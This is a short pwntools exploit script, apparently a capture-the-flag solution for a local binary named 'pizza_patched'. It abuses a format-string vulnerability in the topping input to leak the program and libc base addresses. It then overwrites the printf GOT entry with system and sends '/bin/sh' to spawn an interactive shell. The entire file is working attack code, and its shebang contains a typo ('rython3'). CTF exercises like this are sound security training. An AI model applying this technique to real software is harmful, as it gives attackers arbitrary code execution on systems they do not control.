#!/usr/bin/rython3

from pwn import *

context.arch='amd64'

r = process("./pizza_patched")
e = ELF("./pizza_patched")
libc = ELF("./libc.so.6")

r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'%49$p %47$p')
r.sendlineafter(b'> ', b'0')
r.sendlineafter(b'> ', b'0')
r.recvuntil(b'chose:\n')

code_base = int(r.recvuntil(b' ')[:-1], 0) - 0x1189
print(hex(code_base))

libc_base = int(r.recvline()[:-1], 0) - ((libc.symbols['__libc_start_main'])+133 - 0xbb)
print(hex(libc_base))

r.sendlineafter(b'(y/n): ', b'y')

payload = fmtstr_payload(6, {code_base + e.got['printf']: libc_base + libc.symbols['system']}, write_size='short')

r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', payload)
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'/bin/sh')
r.sendlineafter(b'> ', b'0')


r.interactive()